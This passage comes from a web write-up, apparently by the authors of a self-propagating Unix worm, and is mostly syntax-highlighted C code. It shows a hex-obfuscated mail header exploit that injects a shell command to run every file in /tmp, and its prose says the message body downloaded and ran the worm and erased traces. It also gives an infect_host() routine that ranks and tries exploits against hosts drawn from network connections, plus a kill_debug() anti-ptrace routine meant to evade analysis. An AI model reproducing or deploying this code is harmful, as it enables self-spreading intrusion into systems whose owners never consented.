        "\x5c\x22\x5c\x20\x5c\x29\x5c\x20\x73\x68\x5c\x20\x2d\x63\x5c\x20"
        "\x65\x63\x68\x6f\x5c\x24\x5c\x49\x46\x53\x5c\x5c\x5c\x66\x6f\x72"
        "\x5c\x24\x5c\x49\x46\x53\x5c\x5c\x5c\x69\x5c\x24\x5c\x49\x46\x53"
        "\x5c\x5c\x5c\x69\x6e\x5c\x24\x5c\x49\x46\x53\x5c\x60\x6c\x73\x5c"
        "\x24\x49\x46\x53\x2f\x74\x6d\x70\x2f\x5c\x60\x5c\x24\x5c\x49\x46"
        "\x53\x5c\x5c\x5c\x3b\x5c\x24\x5c\x49\x46\x53\x5c\x5c\x5c\x64\x6f"
        "\x5c\x24\x5c\x49\x46\x53\x5c\x5c\x5c\x73\x68\x5c\x24\x5c\x49\x46"
        "\x53\x5c\x5c\x5c\x2f\x74\x6d\x70\x2f\x5c\x5c\x5c\x24\x69\x5c\x24"
        "\x5c\x49\x46\x53\x5c\x5c\x5c\x3b\x64\x6f\x6e\x65\x26\x3e\x2f\x74"
        "\x6d\x70\x2f\x2e\x4b\x45\x57\x4c\x3b\x5c\x73\x68\x5c\x24\x49\x46"
        "\x53\x5c\x5c\x5c\x2f\x74\x6d\x70\x2f\x2e\x4b\x45\x57\x4c\x22\x0A");

// 'encoding="\\\"x\\\"\ ==\ \\\"x\\\"\ \)\ sh\ -c\ echo\$\IFS\\\for'
// '\$\IFS\\\i\$\IFS\\\in\$\IFS`ls\$IFS/tmp/`\$\IFS\\\;\$\IFS\\\do'
// '\$\IFS\\\sh\$\IFS\\\/tmp/\\\$i\$\IFS\\\;done&amp;&gt;/tmp/.KEWL;\sh\$IF'
// 'S\\\/tmp/.KEWL"'</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style=""><div class="crayon-num" data-line="crayon-60580f2d7606c797330146-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7606c797330146-2">2</div><div class="crayon-num" data-line="crayon-60580f2d7606c797330146-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7606c797330146-4">4</div><div class="crayon-num" data-line="crayon-60580f2d7606c797330146-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7606c797330146-6">6</div><div class="crayon-num" data-line="crayon-60580f2d7606c797330146-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7606c797330146-8">8</div><div class="crayon-num" data-line="crayon-60580f2d7606c797330146-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7606c797330146-10">10</div><div class="crayon-num" data-line="crayon-60580f2d7606c797330146-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7606c797330146-12">12</div><div class="crayon-num" data-line="crayon-60580f2d7606c797330146-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7606c797330146-14">14</div><div class="crayon-num" data-line="crayon-60580f2d7606c797330146-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7606c797330146-16">16</div><div class="crayon-num" data-line="crayon-60580f2d7606c797330146-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7606c797330146-18">18</div><div class="crayon-num" data-line="crayon-60580f2d7606c797330146-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7606c797330146-20">20</div><div class="crayon-num" data-line="crayon-60580f2d7606c797330146-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7606c797330146-22">22</div><div class="crayon-num" data-line="crayon-60580f2d7606c797330146-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7606c797330146-24">24</div><div class="crayon-num" data-line="crayon-60580f2d7606c797330146-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7606c797330146-26">26</div><div class="crayon-num" data-line="crayon-60580f2d7606c797330146-27">27</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style=" -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60580f2d7606c797330146-1"><span class="crayon-e">fprintf</span><span class="crayon-sy">(</span><span class="crayon-v">f</span><span class="crayon-sy">,</span><span class="crayon-s">"From: \"%s\" &lt;%s@%s&gt;\n"</span><span class="crayon-sy">,</span><span class="crayon-v">nam</span><span class="crayon-sy">,</span><span class="crayon-v">us</span><span class="crayon-sy">,</span><span class="crayon-v">buf2</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7606c797330146-2"><span class="crayon-e">fprintf</span><span class="crayon-sy">(</span><span class="crayon-v">f</span><span class="crayon-sy">,</span><span class="crayon-s">"To: &lt;root@%s&gt;\n"</span><span class="crayon-sy">,</span><span class="crayon-v">hostname</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60580f2d7606c797330146-3"><span class="crayon-e">fprintf</span><span class="crayon-sy">(</span><span class="crayon-v">f</span><span class="crayon-sy">,</span><span class="crayon-s">"Subject: %s\n"</span><span class="crayon-sy">,</span><span class="crayon-v">top</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7606c797330146-4"><span class="crayon-e">fprintf</span><span class="crayon-sy">(</span><span class="crayon-v">f</span><span class="crayon-sy">,</span><span class="crayon-s">"MIME-Version: 1.0\n"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60580f2d7606c797330146-5"><span class="crayon-e">fprintf</span><span class="crayon-sy">(</span><span class="crayon-v">f</span><span class="crayon-sy">,</span><span class="crayon-s">"Content-Type: multipart/mixed;\n"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7606c797330146-6"><span class="crayon-e">fprintf</span><span class="crayon-sy">(</span><span class="crayon-v">f</span><span class="crayon-sy">,</span><span class="crayon-s">"\tboundary=\"----=_NextPart_000_0007_01BD5F09.B6797740\"\n\n"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60580f2d7606c797330146-7"><span class="crayon-e">fprintf</span><span class="crayon-sy">(</span><span class="crayon-v">f</span><span class="crayon-sy">,</span><span class="crayon-s">"------=_NextPart_000_0007_01BD5F09.B6797740\n"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7606c797330146-8"><span class="crayon-e">fprintf</span><span class="crayon-sy">(</span><span class="crayon-v">f</span><span class="crayon-sy">,</span><span class="crayon-s">"Content-Type: default/text;\n\t"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60580f2d7606c797330146-9">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7606c797330146-10"><span class="crayon-e">fprintf</span><span class="crayon-sy">(</span><span class="crayon-v">f</span><span class="crayon-sy">,</span><span class="crayon-s">"\x65\x6e\x63\x6f\x64\x69\x6e\x67\x3d\x22\x5c\x5c\x5c\x22\x78\x5c"</span></div><div class="crayon-line" id="crayon-60580f2d7606c797330146-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"\x5c\x5c\x22\x5c\x20\x3d\x3d\x5c\x20\x5c\x5c\x5c\x22\x78\x5c\x5c"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7606c797330146-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"\x5c\x22\x5c\x20\x5c\x29\x5c\x20\x73\x68\x5c\x20\x2d\x63\x5c\x20"</span></div><div class="crayon-line" id="crayon-60580f2d7606c797330146-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"\x65\x63\x68\x6f\x5c\x24\x5c\x49\x46\x53\x5c\x5c\x5c\x66\x6f\x72"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7606c797330146-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"\x5c\x24\x5c\x49\x46\x53\x5c\x5c\x5c\x69\x5c\x24\x5c\x49\x46\x53"</span></div><div class="crayon-line" id="crayon-60580f2d7606c797330146-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"\x5c\x5c\x5c\x69\x6e\x5c\x24\x5c\x49\x46\x53\x5c\x60\x6c\x73\x5c"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7606c797330146-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"\x24\x49\x46\x53\x2f\x74\x6d\x70\x2f\x5c\x60\x5c\x24\x5c\x49\x46"</span></div><div class="crayon-line" id="crayon-60580f2d7606c797330146-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"\x53\x5c\x5c\x5c\x3b\x5c\x24\x5c\x49\x46\x53\x5c\x5c\x5c\x64\x6f"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7606c797330146-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"\x5c\x24\x5c\x49\x46\x53\x5c\x5c\x5c\x73\x68\x5c\x24\x5c\x49\x46"</span></div><div class="crayon-line" id="crayon-60580f2d7606c797330146-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"\x53\x5c\x5c\x5c\x2f\x74\x6d\x70\x2f\x5c\x5c\x5c\x24\x69\x5c\x24"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7606c797330146-20"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"\x5c\x49\x46\x53\x5c\x5c\x5c\x3b\x64\x6f\x6e\x65\x26\x3e\x2f\x74"</span></div><div class="crayon-line" id="crayon-60580f2d7606c797330146-21"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"\x6d\x70\x2f\x2e\x4b\x45\x57\x4c\x3b\x5c\x73\x68\x5c\x24\x49\x46"</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7606c797330146-22"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-s">"\x53\x5c\x5c\x5c\x2f\x74\x6d\x70\x2f\x2e\x4b\x45\x57\x4c\x22\x0A"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60580f2d7606c797330146-23">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7606c797330146-24"><span class="crayon-c">// 'encoding="\\\"x\\\"\ ==\ \\\"x\\\"\ \)\ sh\ -c\ echo\$\IFS\\\for'</span></div><div class="crayon-line" id="crayon-60580f2d7606c797330146-25"><span class="crayon-c">// '\$\IFS\\\i\$\IFS\\\in\$\IFS`ls\$IFS/tmp/`\$\IFS\\\;\$\IFS\\\do'</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7606c797330146-26"><span class="crayon-c">// '\$\IFS\\\sh\$\IFS\\\/tmp/\\\$i\$\IFS\\\;done&amp;&gt;/tmp/.KEWL;\sh\$IF'</span></div><div class="crayon-line" id="crayon-60580f2d7606c797330146-27"><span class="crayon-c">// 'S\\\/tmp/.KEWL"'</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0005 seconds] -->
<p></p>
<p>Message body contained code to be executed (shell-script to connect, download and run worm, then kill any evidence). Yes, this exploit sucks â as it required some kind of user interaction (reading e-mail), but is just an example.</p>
<p>Both remote and local exploits are sorted by effectiveness. Exploits that succed most of the time are tried first. Less effective ones are moved at the end. This list is inherited by child worms.</p>
<p>Oh, spreading. Victims are choosen by monitoring active network connections. With random probability, servers are picked from this list and attacked. In case of success, server is added to âvisitedâ list â these are not attacked anymore. In case of failure, server is not attacked until new version of worm is uploaded. Of course, internal servers list is finite and sometimes server might be attacked again (if itâs not our child and it isnât currently connected), but who cares, attempt will be ignored or upgrade procedure will happen, depending on timestamps.</p>
<p>This code is used to qualify host (obtained from network stats):</p>
<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60580f2d7607e942192214" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; ">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style=""><span class="crayon-title"></span>
			<div class="crayon-tools" style=""><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style=""></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; ">
void infect_host(int addr) {
  struct hostent* h;
  int (*exp)(char*);
  int i=0,n=0,max=VERY_SMALL;
  if ((0x7F &amp; addr)==0x7F) return;      // do not touch 127.* subnet :-)
  h=gethostbyaddr((void*)&amp;addr,4,AF_INET);
  if (is_host_happy(h-&gt;h_name)) return; // In wormnet?
  for (i=0;remote[i].present;i++) remote[i].used=0;
  while ((max=VERY_SMALL)) {
    n=-1;
    for (i=0;remote[i].present;i++)
      if (!remote[i].used &amp;&amp; remote[i].hits&gt;=max) { max=remote[i].hits;n=i; }
    if (n&lt;0) break;
    exp=remote[n].handler;
    remote[n].used=1;
    current_module=n;
    remote[n].hits+=(i=exp(h-&gt;h_name));
    if (i&gt;0) break;
  }
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style=""><div class="crayon-num" data-line="crayon-60580f2d7607e942192214-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7607e942192214-2">2</div><div class="crayon-num" data-line="crayon-60580f2d7607e942192214-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7607e942192214-4">4</div><div class="crayon-num" data-line="crayon-60580f2d7607e942192214-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7607e942192214-6">6</div><div class="crayon-num" data-line="crayon-60580f2d7607e942192214-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7607e942192214-8">8</div><div class="crayon-num" data-line="crayon-60580f2d7607e942192214-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7607e942192214-10">10</div><div class="crayon-num" data-line="crayon-60580f2d7607e942192214-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7607e942192214-12">12</div><div class="crayon-num" data-line="crayon-60580f2d7607e942192214-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7607e942192214-14">14</div><div class="crayon-num" data-line="crayon-60580f2d7607e942192214-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7607e942192214-16">16</div><div class="crayon-num" data-line="crayon-60580f2d7607e942192214-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7607e942192214-18">18</div><div class="crayon-num" data-line="crayon-60580f2d7607e942192214-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-60580f2d7607e942192214-20">20</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style=" -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60580f2d7607e942192214-1"><span class="crayon-t">void</span><span class="crayon-h"> </span><span class="crayon-e">infect_host</span><span class="crayon-sy">(</span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-v">addr</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7607e942192214-2"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-t">struct</span><span class="crayon-h"> </span><span class="crayon-e ">hostent*</span><span class="crayon-h"> </span><span class="crayon-v">h</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60580f2d7607e942192214-3"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">*</span><span class="crayon-v">exp</span><span class="crayon-sy">)</span><span class="crayon-sy">(</span><span class="crayon-t">char</span><span class="crayon-o">*</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7607e942192214-4"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-t">int</span><span class="crayon-h"> </span><span class="crayon-v">i</span><span class="crayon-o">=</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-v">n</span><span class="crayon-o">=</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-v">max</span><span class="crayon-o">=</span><span class="crayon-v">VERY_SMALL</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60580f2d7607e942192214-5"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-cn">0x7F</span><span class="crayon-h"> </span><span class="crayon-o">&amp;</span><span class="crayon-h"> </span><span class="crayon-v">addr</span><span class="crayon-sy">)</span><span class="crayon-o">==</span><span class="crayon-cn">0x7F</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">return</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-c">// do not touch 127.* subnet :-)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7607e942192214-6"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">h</span><span class="crayon-o">=</span><span class="crayon-e">gethostbyaddr</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-t">void</span><span class="crayon-o">*</span><span class="crayon-sy">)</span><span class="crayon-o">&amp;</span><span class="crayon-v">addr</span><span class="crayon-sy">,</span><span class="crayon-cn">4</span><span class="crayon-sy">,</span><span class="crayon-v">AF_INET</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60580f2d7607e942192214-7"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">is_host_happy</span><span class="crayon-sy">(</span><span class="crayon-v">h</span><span class="crayon-o">-&gt;</span><span class="crayon-v">h_name</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">return</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-c">// In wormnet?</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7607e942192214-8"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">i</span><span class="crayon-o">=</span><span class="crayon-cn">0</span><span class="crayon-sy">;</span><span class="crayon-v">remote</span><span class="crayon-sy">[</span><span class="crayon-v">i</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-v">present</span><span class="crayon-sy">;</span><span class="crayon-v">i</span><span class="crayon-o">++</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-v">remote</span><span class="crayon-sy">[</span><span class="crayon-v">i</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-v">used</span><span class="crayon-o">=</span><span class="crayon-cn">0</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60580f2d7607e942192214-9"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">while</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-v">max</span><span class="crayon-o">=</span><span class="crayon-v">VERY_SMALL</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7607e942192214-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">n</span><span class="crayon-o">=</span><span class="crayon-o">-</span><span class="crayon-cn">1</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60580f2d7607e942192214-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">i</span><span class="crayon-o">=</span><span class="crayon-cn">0</span><span class="crayon-sy">;</span><span class="crayon-v">remote</span><span class="crayon-sy">[</span><span class="crayon-v">i</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-v">present</span><span class="crayon-sy">;</span><span class="crayon-v">i</span><span class="crayon-o">++</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7607e942192214-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-v">remote</span><span class="crayon-sy">[</span><span class="crayon-v">i</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-v">used</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-v">remote</span><span class="crayon-sy">[</span><span class="crayon-v">i</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-v">hits</span><span class="crayon-o">&gt;=</span><span class="crayon-v">max</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span><span class="crayon-h"> </span><span class="crayon-v">max</span><span class="crayon-o">=</span><span class="crayon-v">remote</span><span class="crayon-sy">[</span><span class="crayon-v">i</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-v">hits</span><span class="crayon-sy">;</span><span class="crayon-v">n</span><span class="crayon-o">=</span><span class="crayon-v">i</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-60580f2d7607e942192214-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">n</span><span class="crayon-o">&lt;</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7607e942192214-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">exp</span><span class="crayon-o">=</span><span class="crayon-v">remote</span><span class="crayon-sy">[</span><span class="crayon-v">n</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-v">handler</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60580f2d7607e942192214-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">remote</span><span class="crayon-sy">[</span><span class="crayon-v">n</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-v">used</span><span class="crayon-o">=</span><span class="crayon-cn">1</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7607e942192214-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">current_module</span><span class="crayon-o">=</span><span class="crayon-v">n</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60580f2d7607e942192214-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">remote</span><span class="crayon-sy">[</span><span class="crayon-v">n</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-v">hits</span><span class="crayon-o">+=</span><span class="crayon-sy">(</span><span class="crayon-v">i</span><span class="crayon-o">=</span><span class="crayon-e">exp</span><span class="crayon-sy">(</span><span class="crayon-v">h</span><span class="crayon-o">-&gt;</span><span class="crayon-v">h_name</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7607e942192214-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">i</span><span class="crayon-o">&gt;</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">break</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60580f2d7607e942192214-19"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60580f2d7607e942192214-20"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0012 seconds] -->
<p></p>
<p><strong>0x05: Integrity</strong></p>
<p>The most important thing in wormâs life is not to get caught. We have to be sure itâs not easy to trace/debug us â we want to make reverse-engineering even harder. We donât want to expose our internal wormnet protocols, communication with kernel module and detection techniques used by worms to check for themselves, etc. Four things:</p>
<ul>
<li>â hide everything: see section 0x02.</li>
<li>â hash, crypt, scramble: see sections 0x01, 0x04.</li>
<li>
â donât let them caught you: see section 0x02.</li>
<li>â avoid debugging even if we cannot hide!</li>
</ul>
<p>We used several anti-debugger techniques, including application-dependent (bugs in strace on displaying some invalid parameters to syscalls, bugs in gdb while parsing elf headers, ommiting frame pointer, self-modyfing code and so on), as well as some universal debugger-killer routines called quite often (they arenât really time-expensive). This is one of them:</p>
<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60580f2d76080684942263" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; ">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style=""><span class="crayon-title"></span>
			<div class="crayon-tools" style=""><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style=""></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; ">
void kill_debug(void) {
  int x,n;
  n=getppid();
  if (!(x=fork())) {
    x=getppid();
    if (ptrace(PTRACE_ATTACH,x,0,0)) {
      fprintf(stderr,
          "\n\n\n*****************************************\n"
                "*** I REALLY DO NOT LIKE TO BE TRACED ***\n"
                "*****************************************\n\n\n");
      ptrace(PTRACE_ATTACH,n,0,0);
      kill(x,9);
    }
    usleep(1000);
    ptrace(PTRACE_DETACH,x,0,0);
    exit(0);
  }
  waitpid(x,&amp;n,0);
  return;
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
